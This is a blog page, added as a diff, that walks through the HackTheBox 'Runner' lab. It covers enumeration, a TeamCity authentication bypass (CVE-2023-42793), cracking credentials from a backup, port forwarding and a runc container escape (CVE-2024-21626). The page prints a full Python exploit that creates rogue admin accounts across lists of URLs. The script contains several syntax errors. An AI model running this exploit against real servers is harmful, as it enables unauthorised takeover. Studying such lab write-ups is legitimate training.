@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Runner 4b1da7b22392418faa02ce4ffe8868f1 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Runner 4b1da7b22392418faa02ce4ffe8868f1" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Runner" />
+<meta property="og:description" content="Runner" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-11T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Runner 4b1da7b22392418faa02ce4ffe8868f1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"Runner","headline":"Runner 4b1da7b22392418faa02ce4ffe8868f1","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html"},"url":"https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Runner 4b1da7b22392418faa02ce4ffe8868f1</h1>
+  
+  <div class="post-date">
+    Published on 11 Jul 2025
+    
+  </div>
+  
+  <h1 id="runner">Runner</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>We use nmap to make port recognition</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled.png" alt="Untitled" /></p>
+
+<p>A http and ssh ports open, let’s see what’s going on.</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_1.png" alt="Untitled" /></p>
+
+<p>After a long seeking, trying to find directories or subdomains due to the web application doesn’t have any input item, we created a custom dictionary to fuzzing.</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_2.png" alt="Untitled" /></p>
+
+<p>Then, we use go buster and add domains with the corresponding flag</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_3.png" alt="Untitled" /></p>
+
+<p>A subdomain with a log in interface</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_4.png" alt="Untitled" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>A research was necessary to find a vulnerability in this version.</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_5.png" alt="Untitled" /></p>
+
+<p>How ir works:</p>
+
+<ol>
+  <li>Token Deletion: The script initiates a DELETE request to remove the user token associated the default user.</li>
+  <li>Token Creation: Upon successful token deletion, a new user token is created for the same default user.</li>
+  <li>User creation: Using the newly generated token, the script then creates a new user with administrative privileges.</li>
+  <li>Output: Successful exploit are reported, and the compromised URLs are appended to a file <code class="language-plaintext highlighter-rouge">vulnerable.txt</code></li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To generate ramdon names
+</span><span class="kn">import</span> <span class="nn">random</span>
+<span class="c1">#To send http requests
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="c1">#To analyze arguments 
+</span><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="c1">#To process xml responses
+</span><span class="kn">import</span> <span class="nn">xml.etree.Element</span> <span class="n">ar</span> <span class="n">ET</span>
+
+<span class="c1">#Define color 
+</span><span class="n">Color_Off</span><span class="o">=</span><span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+<span class="n">Black</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;30m"</span>
+<span class="n">Red</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;31m"</span>
+<span class="n">Green</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;32m"</span>
+<span class="n">Yellow</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;33m"</span>
+<span class="n">Blue</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;34m"</span>
+<span class="n">Purple</span><span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0;35m"</span>
+
+<span class="k">class</span> <span class="nc">CVE_2023_42793</span><span class="p">:</span>
+	<span class="c1">#Create the constructor
+</span>	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="c1">#Url 
+</span>		<span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="o">=</span><span class="s">""</span>
+		<span class="c1">#Http request session
+</span>		<span class="bp">self</span><span class="p">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+		
+	<span class="k">def</span> <span class="nf">username</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="n">name</span> <span class="o">=</span> <span class="s">"H454NSec"</span>
+		<span class="n">random_id</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+		<span class="k">return</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">name</span><span class="si">}{</span><span class="n">random_id</span><span class="si">}</span><span class="s">
+	
+	def delete_user_token(self, url)
+		self.url = url
+		headers = </span><span class="si">{</span>
+			<span class="s">"User-Agent"</span><span class="si">:</span><span class="s">"Mozilla/5.0 (https</span><span class="si">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">H454NSec</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">42793</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">113.0</span><span class="s">",
+			"</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="s">"</span><span class="si">:</span><span class="s">"application/x-www-form-urlencoded"</span><span class="p">,</span>
+			<span class="s">"Accept-Encoding"</span><span class="si">:</span><span class="s">"gzip, deflate"</span>
+			<span class="si">}</span><span class="s">
+		try:
+			#Send a request to delete the user token
+			response = self.session.delete(f"</span><span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">}</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">rest</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="nb">id</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="n">tokens</span><span class="o">/</span><span class="n">RPC2</span><span class="s">", headers=headers, timeout=10)
+			#If the answer is successful
+			if response.status_code == 204 or response.status_code == 404:
+				self.create_user_token()
+			
+		except Exception as err:
+			pass
+			
+	def create_user_token(self):
+		headers = {
+			"</span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="s">":"</span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">H454NSec</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">42793</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">113.0</span><span class="s">",
+			"</span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="s">":"</span><span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="s">"
+		}
+		try:
+			#send a post request to create a new token
+			response = self.session.post(f"</span><span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">}</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">rest</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="nb">id</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="n">tokens</span><span class="o">/</span><span class="n">RPC2</span><span class="s">")
+			#If the answer is successful extract token value
+			#And create a new user
+			if response.status_code == 200:
+				response_text = response.text
+				root = ET.fromstring(response_text)
+				value = root.get('value')
+				#RFC 751 open standar
+				if value.startswith('eyJ0eXAiOiAiVENWMiJ9'):
+					self.create_user(value)
+		except Exception as err:
+			pass
+			
+	def create_user(self, token):
+		uname = self.username()
+		headers = {
+		"</span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="s">": "</span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">H454NSec</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">42793</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">113.0</span><span class="s">",
+     "</span><span class="n">Accept</span><span class="s">": "</span><span class="o">*/*</span><span class="s">",
+     "</span><span class="n">Authorization</span><span class="s">": f"</span><span class="n">Bearer</span> <span class="p">{</span><span class="n">token</span><span class="p">}</span><span class="s">",
+     "</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="s">": "</span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="s">",
+		}
+		creds = {
+			"</span><span class="n">email</span><span class="s">": "",
+			"</span><span class="n">username</span><span class="s">": uname,
+			"</span><span class="n">password</span><span class="s">": "</span><span class="o">@</span><span class="n">H454NSec</span><span class="s">",
+			"</span><span class="n">roles</span><span class="s">": {
+				"</span><span class="n">role</span><span class="s">": [{"</span><span class="n">roleId</span><span class="s">": "</span><span class="n">SYSTEM_ADMIN</span><span class="s">",
+				"</span><span class="n">scope</span><span class="s">": "</span><span class="n">g</span><span class="s">"}]
+			}
+		}
+		try:
+			#Senfd a post request
+			response = self.session.post(f"</span><span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">}</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">rest</span><span class="o">/</span><span class="n">users</span><span class="s">", headers=headers, json=creds, timeout=10)
+			#if the response is successful
+			if response.status_code == 200:
+				print(f"</span><span class="p">{</span><span class="n">Green</span><span class="p">}[</span><span class="o">+</span><span class="p">]</span> <span class="p">{</span><span class="n">Yellow</span><span class="p">}{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">}</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="n">html</span> <span class="p">{</span><span class="n">Green</span><span class="p">}[{</span><span class="n">uname</span><span class="p">}:</span><span class="o">@</span><span class="n">H454NSec</span><span class="p">]{</span><span class="n">Color_Off</span><span class="p">}</span><span class="s">")
+				with open(vul.txt,"</span><span class="n">a</span><span class="s">") as o:
+					o.write(f"</span><span class="p">[{</span><span class="n">uname</span><span class="p">}:</span><span class="o">@</span><span class="n">H454NSec</span><span class="p">]</span> <span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">}</span>\<span class="n">n</span><span class="s">")
+		except Exception as err:
+			pass
+	#if the script is execute independiently
+if __name__ == '__main__':
+	#Create an object to analize arguments on 
+	#command line
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-u', '--url', help='Url of the web app')
+	parser.add_argument('-l', '--list', help='List of urls')
+	#Analyze arguments
+	args = parser.parse_args()
+	
+	#Array to save list of url's
+	db = []
+	url_list = args.list
+	
+	if url_list:
+		try:
+			with open(url_list, "</span><span class="sa">r</span><span class="s">") as fr:
+			#Read every line on the file
+				for data in fr.readlines():
+					#Delete blank spaces
+					db.append(data.strip())
+		except Exception as err:
+			print(err)
+	
+	elif args.url:
+		db.append(args.url)
+	#Instantiate an object to use it
+	cve = CVE_2023_42793()
+	for ip in db:
+		#Delete the last slash if it is present
+		url = ip[:-1] if ip.endswitch("</span><span class="o">/</span><span class="s">") else ip
+		#Add http is it is not present
+		if not url.startswitch("</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="s">"):
+			if not url.startswitch("</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="s">"):
+				url = f"</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="p">{</span><span class="n">url</span><span class="p">}</span><span class="s">"
+		cve.delete_user_token(url)
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_6.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_7.png" alt="Untitled" /></p>
+
+<p>We can create new projects here, this input is no sanitized but needs some files to recognize it as a repository</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_8.png" alt="Untitled" /></p>
+
+<p>There are some users which can be useful to enumerate users</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_9.png" alt="Untitled" /></p>
+
+<p>Beautiful thing happens on backup section, where we can download the .zip associated to the backup</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_10.png" alt="Untitled" /></p>
+
+<p>There we realize that there are some credentials, with a cryptographic algorithm defined in a column</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_11.png" alt="Untitled" /></p>
+
+<p>We crack Andrew password, it was possible due to Andrew has a insecure password</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_12.png" alt="Untitled" /></p>
+
+<p>We could think that password will be helpful to move forward which is right but first we need get into ssh but those credentials were no useful, so we dig a little more inside and we could find a private key</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_13.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_14.png" alt="Untitled" /></p>
+
+<p>3.Priv esc</p>
+
+<p>We actually don’t have credentials so sudo -l is no possible to execute it, but we can use linpeas to enumerate the whole system.</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_15.png" alt="Untitled" /></p>
+
+<p>We can see a service running locally with the localport. We proceed to port forwarding using chisel</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_16.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_17.png" alt="Untitled" /></p>
+
+<p>Again there is a log in interface, this time we tried with Andrew credentials.</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_18.png" alt="Untitled" /></p>
+
+<p>The services allows to create containers and manage them</p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_19.png" alt="Untitled" /></p>
+
+<p>This version has a vulnerability which we can exploit it through container creation process</p>
+
+<ul>
+  <li>
+    <p>CVE-2024-21626</p>
+
+    <p>runc is a CLI(command line interface) tool for spawning and running containers on Linux according to the OCI(Open Container Initiative). In runc 1.1.11 and earlier, due to an internal file descriptor (Resources which are used access files) leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem. The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc. Variants of these attacks could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_20.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_21.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_22.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_23.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778_Untitled_24.png" alt="Untitled" /></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778.html';
+     this.page.identifier = '/writeups/2025/07/11/901fbfad-d04c-4c4a-9788-83058ce2bad4-export-1c691a1c-5f01-492c-bd60-a7999e80e778';
+     this.page.title = 'Runner 4b1da7b22392418faa02ce4ffe8868f1';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
